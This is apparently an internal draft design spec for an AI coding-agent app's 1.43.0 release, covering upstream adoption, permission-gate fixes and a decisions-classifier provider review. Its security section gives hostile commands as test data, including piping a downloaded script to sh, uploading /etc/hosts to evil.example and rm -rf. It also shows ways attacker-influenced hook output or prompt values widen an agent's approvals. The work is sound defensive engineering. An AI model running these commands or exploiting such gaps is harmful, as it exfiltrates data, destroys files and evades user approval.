# Design spec (DRAFT): upstream 0.14.0 adoption, the H-list review and the 1.42.0 carry-overs (Nessy 1.43.0)

**Promoted 2026-10-15 (UB1.1):** this spec is the 1.43.0 plan's spec, at `docs/superpowers/specs/2026-10-14-upstream-adoption-0-15-1-spec.md` beside its plan `docs/superpowers/plans/2026-10-14-upstream-adoption-0-15-1.md`; the DRAFT labels below are its 2026-10-02 state, kept unchanged. **The v0.14.0..v0.15.1 delta evidence is `docs/superpowers/specs/data/2026-10-14-ub-delta-0-15-1/`** (OWNER-DECISIONS-2026-10-14, the B1–B5 and R3–R6 reader reports, `divergence.json`, `retarget-rows.json`, `all-paths.txt`); the R1, R2, R7 and RT reports there are the done-in-planning outputs of UB13.1, UB14.1, UB14.42 and UB1.18. The controller's inputs file is the appendix beside this file (`2026-10-14-upstream-adoption-0-15-1-spec-appendix.md`).
**Plan:** `docs/superpowers/plans/2026-10-14-upstream-adoption-0-15-1.md` (promoted with this spec by UB1.1; drafted as the 0.14.0 plan), carrying the PORT MANIFEST, the FEATURE INVENTORY (§6 here, renumbered into rows) and a `## Tracker`.
**Status:** DRAFT, 2026-10-02, repaired the same day after a convention critic and a completeness critic (the draft workspace's `README.md` lists every finding applied or rejected). It was synthesised from four reader passes over the upstream delta: decisions, rest-0-14, h-list and security-first. Each pass was an analyst read checked by a skeptic. The controller's inputs file is the appendix beside this file (`2026-10-14-upstream-adoption-0-15-1-spec-appendix.md`); the rest-0-14 reader's full item list is `docs/superpowers/specs/data/2026-10-14-ub-0-14-0/rest-0-14-items.json`. Nothing here is decided until the owner answers §8 or the defaults are taken at the 1.42.0 close-out (owner rule 2026-09-05); OQ-43.2 and OQ-43.2b need the owner's explicit answer. The CRITICAL security findings of §4 are not held for any answer: they are owed as UA12.* rows in the active 1.42.0 tracker now.
**Template:** `docs/superpowers/specs/2026-09-23-upstream-0-13-4-board-planning-pages-design.md` (the 1.42.0 spec). Its posture rules are inherited unless this file says otherwise.

**Readings:**
- **Upstream:** `.references/craft-agents-oss`. The checkout stays at `v0.13.4` (`b2d6c8aa`) while 1.42.0 ports from it. Newer versions are read by tag only: `v0.13.5`, `v0.13.6`, `v0.14.0`. The 1.42.0 manifest base is `v0.10.5`.
  - `git diff --shortstat v0.13.4 v0.14.0`: 311 files, +18,613 / −20,296.
  - `git diff --shortstat v0.10.5 v0.13.4`: 489 files, +45,144 / −2,917. Its paths outside 1.42.0 manifest A–G form the "H-list".
- **Ours:** `feat/TCODE-000-1-41-0`. The readers read HEADs `37fdc5e87`, `81e6d93eb` and `ce1b58b59`, and this draft was assembled at `8faf46cd1`. Line numbers are readings with a date: rows cite symbols and re-take the line at dispatch.
- **Measured vs read.** "MEASURED" means a reader ran our shipped function on the input. The probes were drafted in the git-excluded planning workspace and became the owning rows' tests (the plan's §0.7). Anything not measured is a code reading, and anything resting on prose alone is marked **UNVERIFIED**.
- **Claude pages** are named in words, never by anchor (AGENTS.md anchor rule).

## 0. Summary

1.43.0 adopts what upstream craft-agents-oss shipped after the 1.42.0 port base, plus the older paths 1.42.0 left for "a separate adoption review". There are three sources (§2). The headline findings:

1. **Security first.** Five permission defects were found in ours by reading upstream's fixes. Four were measured on our shipped functions; the source-activation one (SEC-5) is a code reading the row must drive. They are not 1.43.0 features. They are CRITICAL findings, and AGENTS.md (findings become rows at confirmation; CRITICAL ones run at once) already says where they go: UA12.* rows in the ACTIVE 1.42.0 tracker, owed now (§4). This is not an owner question (the earlier OQ-43.1 is withdrawn). 1.43.0 inherits only what they leave behind.
   - **SEC-1.** One Always Allow remembers a key wider than the click. `node -e "console.log(1)"` stores `node`, and on Pi and Codex the same click persists a repository rule `Bash(node *)`.
   - **SEC-2.** Pi's PermissionRequest suggestion is wider again, and an echoed answer can be written durably at a destination nobody offered.
   - **SEC-3.** The `gh api`, `sed -n` and `sort` allowlist rows let a write, a GitHub mutation or a program run with no card, in Ask mode and in Explore/plan alike.
   - **SEC-4.** A curl domain grant covers chains and uploads to other hosts.
   - **SEC-5.** After a Pi source activation, a required card turns into an allow.
2. **The decisions subsystem** (upstream v0.13.6 + v0.14.0, about 4.5k source lines and 2.6k test lines) is the largest feature. It is a typed classifier ("System One", Jev wire `POST {base}/v1/systemone`), not an LLM call. Neither the Nestor gateway nor any BYO chat connection can serve that wire. So its fate is a **provider question** (OQ-43.2, with OQ-43.2b on what the app says about Laya); both need the owner's explicit answer. The recommendation:
   - ship the host core with only the **local Laya** and **custom** providers, with no installer command and no external docs link;
   - write NO Nessy Gateway preset or probe until the gateway team publishes a decision route and its contract (the ⛔ follow-up row UB6.18);
   - drop the three SaaS presets under reason (b).

   Of its twelve host features, nine are adapted, one waits for a measurement and two are dropped under (c):
   - **Guarded mode** is dropped because our `auto` mode already fills that slot on all three runtimes, with each runtime's own judge.
   - **Adaptive thinking** is dropped because Claude's adaptive thinking is native.
3. **About 40 decision-free upstream fixes** (v0.13.5–v0.14.0) are taken or adapted. Examples: the Claude plan/auth handoff wait, Stop no longer re-running the message, the Pi `/compact` steer loss, the source-test with stored credentials, the masked-key connection test, the browser-pane teardown, and the RFC 8707 resource.
4. **The H-list** (v0.10.5..v0.13.4 paths outside 1.42.0's manifest) is mostly already ours. The readers found these not ours yet:
   - the Pi developer git context;
   - prompt-value sanitising (security, (b));
   - the date line that tells the model to ignore dates in files;
   - two English strings in the Russian UI;
   - the retired ChatGPT search model id;
   - the TypeBox import;
   - two connection-layer fixes;
   - workspace avatars;
   - three measurements: Claude `/compact` success with no boundary, the composer at high zoom, and the update handoff.
5. **Not in 1.43.0:**
   - SaaS decision providers, Guarded mode and adaptive thinking;
   - messaging bridges and GitHub Copilot sign-in;
   - Craft services (the Slack relay, the docs domain), and the four extra locales;
   - SDK bumps until the Artifactory mirror holds them (§9).

Nothing is gated (owner 2026-09-23, inherited). The decisions layer is OFF by default as upstream ships it. That is a **user setting with a product default**, the same class as upstream's Appearance preferences, not a feature flag: no env var, no build flag, no managed switch (§3.4).

## 1. Owner mandate

| # | Date | Words | Reading |
| --- | --- | --- | --- |
| 1 | 2026-10-02 | «можно будет составить новый план что бы сделать после канбана» ("we can put together a new plan to do after the kanban") | This spec: a 1.43.0 plan drafted while 1.42.0 (kanban) runs. It executes after 1.42.0 closes. |
| 2 | 2026-10-02 | «максимально по референсу» ("as close to the reference as possible") | Upstream parity is the default disposition. Every departure carries a reason from §3.2 and a cited file. |
| 3 | 2026-09-23 (inherited) | The port-maximal addendum: drop only for (a) a Craft external service, (b) a security posture with no safe adaptation, (c) an existing Nessy feature that does it better, citing the file | §3.2. |
| 4 | 2026-09-23 (inherited) | «нет, закрывать ничего не нужно, делаем сразу как доступные фичи» ("no, nothing needs to be gated; we ship them straight away as available features") | §3.4: no feature gating. The decision layer's own off-by-default switch is a user setting, as upstream ships it (OQ-43.5). |
| 5 | 2026-10-01 (memory) | SDKs from Artifactory only, after the 14-day mirror | The Claude Agent SDK 0.3.280 and Pi 0.87.1 lifts wait (R14-27, R14-28). |
| 6 | 2026-08-28 (AGENTS.md) | Native-first; read, do not invent; transparent and simple | Every BUILD below states what it found when it asked whether the runtime already has it. |

## 2. Scope: the three sources

| Source | What | Reader |
| --- | --- | --- |
| **S1. The v0.14.0 decisions subsystem** | v0.13.6 shipped the client, settings, the `decide` tool, the RPC and the Settings card. v0.14.0 added decision points, usage and 13 feature toggles. | decisions (DEC-0…DEC-15) |
| **S2. Every other v0.13.5–v0.14.0 change** outside the 1.42.0 plan | `git -C .references/craft-agents-oss diff --name-only v0.13.4 v0.14.0`, minus paths 1.42.0 owns | rest-0-14 (R14-*), security-first (U43-SEC.*) |
| **S3. 1.42.0 Port manifest section H** ("out of scope … a separate adoption review") | `diff --name-only v0.10.5 v0.13.4` paths not in manifest A–G | h-list (H1…H52) |
| **Routed from 1.42.0** | The automation loop guard, carrying our divergence (R14-44). The TaskRunner decision seams (UA4.1 residue → DEC-2/DEC-3). Semantic labels and conditions (DEC-5/DEC-6). The labels.md auto-rules docs. The deferred UA12.* rows the readers matched: UA12.17, UA12.18, UA12.29, UA12.37, UA12.38 and UA12.39. | inputs file |

**1.42.0 rows are not re-owned.** An item the readers matched to an existing UA row is listed in §6.J and stays on that row. If the row is still open when 1.42.0 closes, the 1.43.0 plan carries it by reference, with a pointer back, and does not duplicate it.

## 3. Posture rules

### 3.1 Port rules (inherited from the 1.42.0 spec §3)

- **Default disposition: copy-verbatim.** "Adapt" means only these changes:
  - rebrand (`Craft`→`Nessy`, `@craft-agent`→`@nessy-agent`, `CRAFT_`→`NESSY_`, `~/.craft-agent`→`CONFIG_DIR`/`NESSY_CONFIG_DIR`, `craft-*` localStorage→`nessy-*`, `X-Title: Craft Agents` removed);
  - en and ru i18n;
  - our tokens and components;
  - the host seam;
  - the stated divergences, each with its reason.
- **Headers.** Copied files record `v0.14.0:<path>` (or `v0.13.6:`). Adapted prompt text records its source and licence: Apache-2.0, LICENSE and NOTICE kept.
- **Docs.** Shipped product docs are rewritten in our words and land with their code. They describe what OUR code does. Example: upstream's automations loop-guard bullet overstates upstream's own code (inputs, skeptic correction).

### 3.2 Drop reasons

| Code | Reason | Requires |
| --- | --- | --- |
| drop-a | A Craft external service or Craft branding | the host or knob named |
| drop-b | A security or network posture with no safe adaptation, including a new third-party service carrying session content | the data that would leave named, plus an owner question if it is a posture choice |
| drop-c | An existing Nessy feature does it better | the file and symbol cited |
| measure | Decide after a named measurement | the instrument and the decision rule |
| owner-question | A user-visible posture choice | options and a default in §8 |

### 3.3 Three runtimes

Every adopted capability names its reach on Pi, Claude (Agent SDK) and Codex (app-server), or a **stated residue**. The order follows the AGENTS.md native-first rule:

1. Enable the runtime's own mechanism.
2. Otherwise, build it once in the host.
3. Only then build it per runtime, recording why steps 1 and 2 failed.

**Evidence differs by runtime.** For Claude, the documentation page is the contract. For Codex, a claim backed only by a docs page is a hypothesis, and the source or the binary outranks it.

### 3.4 No feature gating, and what an "off" default is here

- **No gating.** No row adds a build flag, an env toggle, a managed switch key or a `feature-disabled` refusal.
- **The decision layer's `enabled: false` default is upstream's user setting,** stored in `StoredConfig.decisionLayer` and set in Settings → AI. Keeping it off by default is parity, not gating: the layer cannot work until the user picks a provider (or starts Laya), and every caller falls back to today's behaviour when it is off.
- **Per-feature toggles keep upstream's defaults** for the features adopted: `decideTool`, `taskVerdicts` and `semanticLabels` on; the rest off. Toggles of dropped features are not shipped, and the Settings docs say so.
- **The `decide` tool's offer condition** is OQ-43.5. Under (a) it is a stated deviation from the 1.42.0 Session-tools rule (which forbids a `SessionToolFilterOptions` field and an `isOfferedByHostPorts` arm): a `decidePort` capability condition like `reviewDiffPort`, bound only when a provider is configured; the plan's Global Constraints carry the mechanism, the `availabilityCondition` wording and the pins.

### 3.5 Network posture (T-Bank)

- **Allowed model traffic.** It goes through the Nestor gateway (`Nestor-Token`, only on the verified URL) or through the user's own BYO connection.
- **New third parties need an owner decision.** A new third-party service that receives session content (user messages, tool arguments, permission-prompt text, file contents) is **not** added without one.
- **Loopback is fine.** A loopback service the user runs (Laya on `127.0.0.1`) is not egress.
- **Installer commands are posture too.** A UI that suggests a third-party installer (`curl … | sh`) is a posture choice (OQ-43.8).

### 3.6 Conventions (inherited)

- **i18n:** keys in `en.json` and `ru.json` only, flat and sorted. Keys commit first and the reader second.
- **New StoredConfig keys:** declared in `StoredConfigKnownFields` per the DA1.72 recipe, with reader, envelope and guard fixture in ONE commit. 1.43.0 needs two: `decisionLayer` (DEC-0) and `rtkExcludeCommands` (R14-26).
- **New RPC modules:** `HANDLED_CHANNELS`, the agreement and registration tests, `ipc-inventory`, and a `routing.ts` class.
- **New session tools:** the full file set of the 1.42.0 plan's "Session tools" Global Constraint, codex bridge included.
- **Findings:** they become rows at confirmation. Since 2026-09-24 only CRITICAL ones run at once.
- **No real credentials.** No row reads or prints one.

## 4. Security and correctness items first

They are listed before any feature because AGENTS.md classes security findings as CRITICAL (run at once) and makes a finding a row AT CONFIRMATION. That is a rule, not an owner question (OQ-43.1 withdrawn). Owed now by the controller in the ACTIVE 1.42.0 tracker: UA12.* `[CRITICAL]` rows for SEC-1, SEC-3 and SEC-4 (each MEASURED) and SEC-2 (session half measured; paired with SEC-1). SEC-5 is a code reading: the controller drives it and births its row on confirmation. Every row re-reads its premise at HEAD as usual; that re-read is not a condition on the severity. The 1.43.0 plan lists them only as pointers (UB1.2–UB1.6).

| ID | Defect in ours | Evidence | Upstream fix | Disposition | Runtimes | Size | Severity |
| --- | --- | --- | --- | --- | --- | --- | --- |
| **SEC-1** (U43-SEC.1 + R14-02) | The Always Allow remember key is wider than the click. `bashSessionWhitelistKey` (`agent/core/dangerous-commands.ts`) keys on every leading non-flag word. Its interpreter refusal covers shells and `env`/`xargs`, but not python, node, ruby, perl or deno. `DANGEROUS_COMMANDS` has only 4 two-word entries. | MEASURED, `probe-remember-key.ts` at `81e6d93eb`. Each pair is "approve X → a later call that runs with NO card": `git clean -n`→`git clean -fdx`, `git branch`→`git branch -D main`, `git stash`→`git stash drop`, `git tag`→`git tag -d v1`, `git restore --staged a`→`git restore .`, `npx prettier --check .`→`--write .`, `python3 script.py`→`… --delete-all`, `node -e "…"`→`node evil.js`. Controls that still card: `git status`→`git push --force` (the pair floor), `npm test`→`npm publish`, `docker compose ps`→`down -v`, `kubectl get`→`delete`. On Pi and Codex the click also writes a durable `Bash(<key> *)` to `.claude/settings.local.json` (`bash-remember-scope.ts`, `SessionManager.persistBashAlwaysAllowRule`). | v0.14.0 `agent/core/permission-remember.ts` `getBashRememberKey`. Keyed by at most 3 leading words. Interpreters and runners (`python`, `node`, `npx`, `docker run`, `npm run`) are keyed on the exact argv. No key for wrappers, `gh api`, a flag before the subcommand, or a destructive word. `DANGEROUS_COMMANDS` grows. A card with no key hides Always Allow. | **take** the classification into `bashSessionWhitelistKey`. **Adapt** the spelling: an exact-argv key persists as `Bash(<whole line>)` with no ` *`, and the consult matches it exactly, not by prefix. Keep D1.401 (chains) and D1.403 (wrappers). Keep D1.262's relabel, but hide the button when no key is minted. Native check: Claude's own dialog stores the whole line (the hooks page's PermissionRequest example), so upstream now matches native. | One shared function covers all three. **Pi:** session key plus the durable rule. **Claude:** session key only. **Codex:** the host's durable rule is projected into execpolicy (F1.1057). Codex's own `acceptForSession` cache and its `proposedExecpolicyAmendment` are native, which is a residue (source claim, not measured). | M | CRITICAL |
| **SEC-2** (U43-SEC.2) | Pi `buildPermissionRequestSuggestions` (`pi-agent.ts`, the `${baseCommand}:*` rule) offers `Bash(<first word>:*)` at destination `session`. Its docstring claims this is what Always Allow persists, which has been stale since D1.314/D1.404. `wasOffered` compares rule strings only, not the destination, and the echo is then written to localSettings/projectSettings. | Code reading, with the session half measured by the SEC-1 probe. A hook that echoes `Bash(git:*)` stores session key `git`: `git clean -fdx` and `git branch -D main` then get no card. Echoed at `localSettings`, it persists `Bash(git:*)`, which clears `git push --force` in every later session of that repository. A plugin hook's stdout can be influenced by an attacker, as the file's own docstring says. | No upstream counterpart (upstream has no PermissionRequest hooks). Contract: the hooks page, sections "PermissionRequest input" and "Permission update entries" ("a hook can echo one of the `permission_suggestions` it received"). | **take (ours)**: build the suggestion from the SEC-1 key, at the destination the dialog's Always actually writes on Pi (OQ-43.3). Offer nothing when the key is null. `wasOffered` requires the destination to match. Correct the docstring. | **Pi only.** **Claude:** the SDK's suggestions are native, so n/a. **Codex:** no suggestion builder, so n/a. | S | CRITICAL |
| **SEC-3** (U43-SEC.3 + R14-04) | The allowlist regexes in `apps/electron/resources/permissions/default.json` for `gh api` (≈L185), `sed -n` (≈L381) and `sort` (≈L385) see only the spaced or `=` spellings. Ask mode auto-allows any allowlist match (`shouldPromptInAskMode` → `isReadOnlyBashCommandWithConfig`), and Explore/plan/dontAsk treat it as read-only. | MEASURED, `probe-explore-verbs*.ts` against the shipped `default.json`. These return READ-ONLY: `gh api -XPOST …`, `gh api … -ftitle=x` / `-Ftitle=x` (gh POSTs when fields are present), `gh api -H "X-HTTP-Method-Override: DELETE" …`, `gh api -XDELETE …`, `sed -n 's/a/b/w out' f`, `sed -n '1w out' f`, `sed -n -Ei s/a/b/ f`, `sort -uo out in`, `sort -ro out x`, `sort --compress-program=./x.sh …` (runs a program). Controls refused: `sed -n -i`, `sort -o`, `gh api -X POST`, `sed -n 's/a/b/e'`, `sed -n -f`. | v0.14.0 `agent/bash-validator.ts` argv inspectors: `getDangerousSedReason`/`getUnsafeSedScriptReason` (in-place in any cluster, `-f`, `w`/`W`, `s///w`, `s///e`, print-only command set), `getDangerousSortReason` (`-o` in any cluster, `--output`, `--compress-program`), `getDangerousGhReason` (non-GET/HEAD method incl. attached forms, fields without GET, method-override header, graphql mutation). | **take** the inspectors into our `validateBashCommand` path (permissive upstream; record source and licence). Keep our anchored regexes as the first gate. Pin both arms, including real reads (`sort -k`, `sed -n p`). | **Pi and Claude:** the shared host gate. **Codex:** whether our gate auto-accepts a codex exec approval for these lines is not measured. Codex's own `is_known_safe_command` plus its sandbox is the native, stricter layer, so this is a residue to measure on the binary. | M | CRITICAL |
| **SEC-4** (R14-01) | After Always Allow on `curl https://ok.example/data.json`, the domain arm of `shouldPromptInAskMode` (`pre-tool-use.ts`, after the session-key arm) auto-allows any command whose FIRST URL is on that host. The arm has no chain or segment check: D1.401 covers only the session-key arm. | MEASURED by the rest-0-14 reader (a bun driver on `shouldPromptInAskMode`). AUTO-ALLOW for `curl https://ok.example/i.sh \| sh`, `curl https://ok.example/a https://evil.example -T /etc/hosts`, `curl https://ok.example/a; rm -rf ./x`. Control: `curl https://evil.example/a` prompts. | v0.14.0 `permission-remember.ts` `getNetworkCommandHosts`: a single plain command only, keyed by EVERY host, null for chains, `-K`/`--config`, unparsable URLs and the `https://evil#@ok` trick. | **take**, plus the consult side: every host must be whitelisted and the command must be one plain command. Reuse our durable-engine splitter (`bashSessionGrantCoversLine`). | **Claude:** fixed (only `claude-agent` writes `whitelistDomain`). **Pi:** consults the same arm but never writes a domain grant, a residue to state or wire. **Codex:** native execpolicy, n/a. | S | CRITICAL (MEASURED at `37fdc5e87`) |
| **SEC-5** (R14-08) | Pi PreToolUse after source activation (`pi-agent.ts`, the `source_activation_needed` arm): the re-run's result is mapped modify→allow, block→deny and everything else → allow. A default-mode `prompt` card and a second `source_activation_needed` therefore become allows, and the guardian deny-net is not consulted on the re-run. | Code reading, not yet driven. | v0.14.0 `pi-agent.ts`: after activation the WHOLE pipeline re-runs and its result is handled like any other. A still-inactive source blocks. No permission handler means deny. | **take**. The row must DRIVE it: an inactive source plus a mutating MCP tool in default mode must show a card. Also add "no permission handler → deny" if the permission service does not already deny headless asks. | **Pi:** fixed. **Claude:** already denies and resumes next turn, no residue. **Codex:** sources arrive via the bridge, not this path. Stated. | S | CRITICAL once driven |
| SEC-6 (U43-SEC.4 + R14-05) | `MCP_WRITE_TOKENS` (F1.289; 25 words, `_`-split only) lacks archive, ack, cancel, approve, revoke, publish, deploy, trigger, invoke, submit, uninstall, sync, kill and others, so `get_and_archive_thread`, `fetch_and_ack` and `list_and_cancel_jobs` read as read-only. The inputs note that `get_or_create_issue` is read-only is **stale** (F1.289 refuses it). | MEASURED on synthetic names only. No catalogued real tool was shown to hit it. | v0.14.0 `agent/mcp-tool-names.ts` `isReadOnlyMcpToolName`: about 120 write words, camelCase and hyphen splitting. | **adapt**: take the word list and the camel/hyphen splitting. Keep our leading-verb anchoring. **Do not** adopt upstream's two widenings (a read verb after the source slug, or a trailing read verb). That is a stated residue. UA9.2 (✅, `894891e14`) reuses the safe-mode allowance, so it inherits the word list. | Shared host classifier: Pi gate, the Pi deferred catalogue (F1.295), Claude PreToolUse. **Codex:** native MCP approvals plus our gate; UA12.11 would pin the agreement but is ⬜ (DEFERRED), so nothing pins it yet. | S | MEDIUM |
| SEC-7 (H9) | Raw values in system-prompt blocks: `<working_directory>` (`prompts/system.ts`), `## User Preferences` with a raw name and notes that the agent can write via `update_user_preferences` (`prompts/preferences.ts`), and `session_state` values (`mode-manager.ts` `formatSessionState`). Sources are already sanitised (F1.245, F1.323–F1.325, `prompts/untrusted-text.ts`). | Code reading. | v0.13.4 `sanitizePromptLine` at all three sites, plus the `<user_preferences>` block worded "follow unless they conflict". | **take** (reason (b)). Reuse `untrusted-text.ts` or UA5.5's `prompt-sanitize.ts`. The preferences wording change goes in the release notes. | Host prompt builder for Pi and Claude. **Codex:** verify that its developer instructions read the same builder, otherwise a residue. | S | HIGH |
| SEC-8 (DEC-0 part) | Only if the decisions core is adopted: `decisions:setSettings` (provider, baseUrl) and `decisions:setApiKey` are `REMOTE_ELIGIBLE` upstream. A remote client could repoint the classifier, which receives user messages, tool arguments and prompt text. | Upstream reading. | none upstream | **adapt**: refuse provider, baseUrl and key changes from a non-local client (the `REMOTE_CLIENT_PERMISSION_MODE_CEILING` posture). `Nestor-Token` is never sent to a non-verified URL. | Host. | XS (inside DEC-0) | HIGH (design-time) |
| SEC-9 (R14-22) | Dev-build interceptor log: `toCurl` writes full request bodies (prompts, tool arguments, base64 images), and the log rotates by age only. | Code reading. Dev builds only (`INTERCEPTOR_LOGGING_ENABLED = !IS_PACKAGED`). | v0.13.6 #1033: rotation at 32 MiB, a 4 MiB entry cap, bodies omitted unless `…_DEBUG_FULL_BODIES=1`. | **take**, env renamed `NESSY_DEBUG_FULL_BODIES`. | Runtime-neutral (host and the Pi subprocess preload). | S | LOW (privacy, dev) |

**Correctness items of the same urgency class** ("wrong user-facing behaviour" is CRITICAL per AGENTS.md once measured):

| ID | Defect | Evidence | Disposition | Runtimes | Size |
| --- | --- | --- | --- | --- | --- |
| **COR-1** (U43-SEC.5 + R14-10) | Claude plan and auth handoff. `interruptForHandoff` (`claude-agent.ts`) interrupts at once. The auth path reaches it synchronously before the tool returns (`SessionManager.beginAuthRequest`), and the plan path after one `readFile`. The SDK then stores "The user doesn't want to proceed with this tool use", so after OAuth or plan acceptance the model reads its own call as a refusal. | Code order, plus the template string in our bundled CLI 2.1.274 (`grep -a`, 4 occurrences), plus our own test header in `claude-card-withdrawn-on-abandoned-call.test.ts`. The transcript is not yet measured on `claude-gateway`. | **take** v0.14.0's `toolHandoff` (`HANDOFF_TOOL_NAMES`, `HANDOFF_RESULT_WAIT_MS` 3000, `beginToolHandoff`, wait for the tool_result or 3 s). Keep F1.335's `pauseSteerFifo` and F1.238's steer retention. Measure first: the SubmitPlan tool_result after a plan card. | **Claude:** fixed. **Pi:** the plan goes through `planModePort`, unaffected. The Pi auth path (base `forceAbort`) is unmeasured, a residue. **Codex:** `turn/interrupt` with the MCP call in flight is unmeasured, a residue. | S |
| **COR-2** (R14-11) + the keep-alive Stop hunks | Claude Stop before the first assistant token on any resumed turn. The `user_stop` slot reaches the post-loop check `wasResuming && !receivedAssistantContent && !_isRetry`, which clears the SDK session id and re-sends the message with recovery context. Three sibling v0.14.0 hunks of the same fix: the `AbortError` branch calls `eventAdapter.flushPending()` first (ours does not: our only flush is in the no-result region a Stop never reaches), each consumer is bound to its own query and tears down only that one, and a Stop while the turn is being prepared is an interruption, not an error. | Code reading at `49f505fd5`. | **take**: skip the recovery on `user_stop` or `max_budget_usd`; flush on abort; read our `live-session.ts`/`turn-slot.ts` keep-alive for the cross-query race and take the binding only on a found race; the outer-catch arm only if a pre-turn `await` can throw. Measure first: Stop within about 1 s on turn 2, and Stop mid-answer then reload, on `claude-gateway`. | Claude only. | M |
| **COR-3** (R14-14) | Pi `/compact`: `redirect()` steers while `_isProcessing` (true during compaction), so the message goes into a turn with no agent loop and **vanishes**. The compact timeout rejects without cancelling the child. `waitForCompaction` polls for up to 300 s. Upstream fixed #1058 on Claude too: `ClaudeAgent.isCompactionInFlight()` makes the session layer queue a message sent during a manual `/compact` (Claude steers are delivered at a tool call, which a compaction turn never makes). | Code reading; ours has no `isCompactionInFlight` on Pi or Claude. | **take** v0.13.6 #1058/#1060: `isCompactionInFlight` queues it (SessionManager reads it). The timeout bumps the epoch and aborts. `compaction-wait.ts` bounds the wait. Pin queue-not-steer (F1.238). `canSteerNow` is NOT part of it: its only v0.14.0 caller is the DEC-11 decision path. | **Pi:** fixed. **Claude:** measure a message during `/compact` on `claude-gateway`; KEEP if F1.238's turn-end requeue already re-sends it once, else take `isCompactionInFlight`. **Codex:** native compaction; whether a steer during compaction is accepted is a measurement, a residue. | M |

## 5. Network and provider analysis

### 5.1 The decision model (DEC-15, OQ-43.2)

**The wire.** `POST {base}/v1/systemone` with `{model, state, questions}` returns `{model, answers, usage}`. Questions are `choice` (2–255 options), `score` (an ordered rubric of 2–10 levels) or `noul` (a yes/no probability). Answers are probabilities. It never writes text and never grants authority.

| Option | Egress | Auth | Fits §3.5? | Notes |
| --- | --- | --- | --- | --- |
| TypeSafe (`api.typesafe.ai`, `jev-1.13.0`) | user messages, tool args, prompt text → new SaaS | Bearer key (`decision_api_key::typesafe`) | **no**: a new third party | drop-b by default |
| OpenRouter (`typesafe/jev-1.13`) | same, via OpenRouter | can reuse an OpenRouter BYO key (`models-pi.ts`) | **no**: the model vendor is a new third party even when the key is the user's | drop-b by default |
| Vercel AI Gateway (`typesafe-ai/jev`) | same | Bearer | **no** | drop-b by default |
| **Laya (local)** | none from the app (loopback `127.0.0.1:8000`); installing it fetches the package from public PyPI and the checkpoints from a public source | none | **yes for the traffic; the install source is OQ-43.2b** | The user runs `pip install "laya[serve]"` and `laya-serve` themselves. Upstream's preset SHOWS that command as `installHint` when the probe fails and links `github.com/NandhaKishorM/laya` as `docsUrl` (v0.14.0 `decisions/providers.ts`); both are posture (OQ-43.2b), default not shipped. The checkpoints are Apache-2.0 per the repo README, read 2026-10-02 (**UNVERIFIED** beyond the README; UB6.2 reads the licences first). Nothing ships it. The English checkpoint reads about 512 tokens; the multilingual one (1024 tokens, Russian in its eval set per the README) is what `auto` routes to. Quality on Russian is a measurement owed. |
| **Custom** | to the URL the user enters | optional key | **yes, if** the URL is T-Bank-internal or loopback; the user's choice | Remote clients cannot set it (SEC-8). It never receives `Nestor-Token`. |
| **Nessy Gateway (future)** | the Nestor gateway | `Nestor-Token`, verified URL only | **yes** | Needs the gateway team to expose a Jev-compatible route (laya-serve or a licensed Jev). Today the gateway is chat completions only: a Responses call already answers 400 `unsupported endpoint` (memory nestor-gateway-capabilities, probed 2026-07-03). **No preset or probe code is written before the route and its contract are published** (read-don't-invent): it is the ⛔ follow-up row UB6.18. Model resolved by alias, never pinned. |
| Emulating it over chat completions on `fast` | gateway | Nestor-Token | yes, but **invented** | No calibrated probabilities (gateway logprobs unmeasured), seconds of latency against the 3 s foreground cap, gateway quota per user message. **Not recommended** (read-don't-invent, step 4). |

**Cost and benefit.**
- **Without a provider.** Every feature falls back to today's behaviour. That is upstream's invariant and the reason a local-only ship is safe.
- **The net gain** is fewer gateway calls (small-talk titles skipped, verdict re-asks avoided) and some automations not run. A **local or nearby** provider is the only shape where the classifier is cheaper than the LLM call it replaces (DEC-9, DEC-12).

### 5.2 Other egress-relevant items

| Item | Egress | Default |
| --- | --- | --- |
| rtk update dialog (R14-26) | Upstream shows `curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/…/install.sh \| sh` | Port the floor, the notice and the dialog, but name only the minimum version: "update rtk the way you installed it" (OQ-43.8 (b)) |
| Moonshot AI presets (H24) | The user's own key → `api.moonshot.ai` / `api.moonshot.cn` | Labels, icons and the Kimi defaults only; no new preset URLs (OQ-43.9 (a)) |
| Messaging bridges (H18) | Session content → Telegram/WhatsApp | drop-b, recorded (OQ-43.10 (a)) |
| GitHub Copilot OAuth (H19) | A new model vendor | drop-b, recorded (OQ-43.10 (a)) |
| Slack legacy relay (R14-19) | `thecraftagents.com/auth/slack/callback` | drop-a |
| v0.12.0 domain move / docs site (H16) | Craft hosts | drop-a (already true here) |
| RFC 8707 resource (R14-18) | None new: the same OAuth servers | take |

## 6. Feature inventory

Columns: **ID** (reader id, stable) · **Upstream behaviour** · **Ours** (reading) · **Disposition** · **Why** · **Runtimes** · **Size**. SEC-* and COR-* are in §4 and only cross-referenced here. Sizes: XS < 50 lines, S < 200, M < 600, L above that.

### 6.A Decisions subsystem (S1)

| ID | Upstream behaviour | Ours | Disp. | Why | Runtimes | Size |
| --- | --- | --- | --- | --- | --- | --- |
| DEC-0 | Host core. `shared/src/decisions/{client, providers, settings, resolve, records, status, health, usage, types}`. `StoredConfig.decisionLayer` (enabled=false, provider, connectionSlug, baseUrl, model, deadlineMs 1500, 13 toggles). Gate order: switch → toggle → key → endpoint. `decisions.jsonl` records question keys, probabilities, and the sha256 and byte count of the state, never the text. Server-core `decision-point.ts` (`openDecisionPoint`, `FOREGROUND_MAX_DEADLINE_MS` 3000). `rpc/decisions.ts` (7 channels). The `decision_api_key::{provider}` credential. A Settings → AI "Decision model" card (+428 lines, about 95 keys). `decisions.md`, `scripts/decisions-report.ts`. | absent (no decisions package at `37fdc5e87`) | **adapt** | The substrate for every DEC item; not a Craft service. Providers per OQ-43.2. Paths under `CONFIG_DIR`, `X-Title` removed. SEC-8 (no remote provider changes, no Nestor-Token off the verified URL). Upstream's invariants kept verbatim: zero authority, fail closed, the state never logged, the pinned model and the reported model both recorded. | Host only, so the same on all three; the runtimes never see the client. || L |
| DEC-15 | Providers: typesafe, openrouter, vercel-ai-gateway, laya, custom. One wire everywhere. | no provider; the gateway serves chat completions only | **owner-question** (OQ-43.2) | §5.1. Recommended: laya + custom now (OQ-43.2b: no install hint, no external link), a Nessy Gateway preset only after the gateway publishes a route (UB6.18 ⛔), SaaS dropped (b). | Host only. | S |
